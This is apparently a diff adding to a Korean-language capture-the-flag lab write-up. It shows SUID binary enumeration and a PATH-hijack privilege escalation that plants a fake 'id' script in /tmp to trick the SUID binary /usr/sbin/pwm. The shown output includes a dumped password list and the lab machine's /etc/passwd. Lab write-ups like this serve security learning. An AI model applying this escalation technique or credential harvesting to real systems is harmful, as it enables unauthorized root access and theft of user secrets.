@@ -581,3 +581,149 @@ ww-data@ip-10-10-67-138:/$ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/newgrp
 /usr/bin/pkexec
 /usr/bin/umount
+
+# ls -la /home
+
+홈 확인
+
+```bash
+cd /tmp
+echo '#!/bin/bash' > id
+echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
+chmod +x id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+```
+
+#!/bin/bash
+
+# /tmp 디렉토리로 이동 (모든 사용자가 쓰기 가능한 임시 폴더)
+
+cd /tmp
+
+# 가짜 id 명령어 스크립트 생성 시작
+
+# 첫 줄: Bash 스크립트임을 명시
+
+echo '#!/bin/bash' > id
+
+# 두 번째 줄: 실제 id 명령처럼 보이는 출력 삽입
+
+echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
+
+# 생성한 스크립트를 실행 가능하게 설정
+
+chmod +x id
+
+# 환경변수 PATH의 가장 앞에 /tmp 추가
+
+# -> 시스템이 명령어를 찾을 때 /tmp부터 먼저 찾게 됨
+
+export PATH=/tmp:$PATH
+
+# pwm 실행 (이 바이너리가 내부에서 'id'를 실행할 경우 우리가 만든 /tmp/id 실행됨)
+
+# 이로써 출력 결과를 조작할 수 있으며, pwm이 SUID 루트일 경우 권한 상승 가능성 존재
+
+/usr/sbin/pwm
+
+# /usr/sbin/pwm
+
+www-data@ip-10-10-67-138:/tmp$ /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+
+# cat /etc/passwd
+
+www-data@ip-10-10-67-138:/$ cat /etc/passwd
+root:x:0:0:root:/root:/usr/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+think:x:1000:1000:,,,:/home/think:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+ssm-user:x:1001:1001::/home/ssm-user:/bin/sh
+ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
+
+# 1000:1000
+
+일반적으로 첫 사용자 ID 로 부여되는 사용자 및 그룹 ID
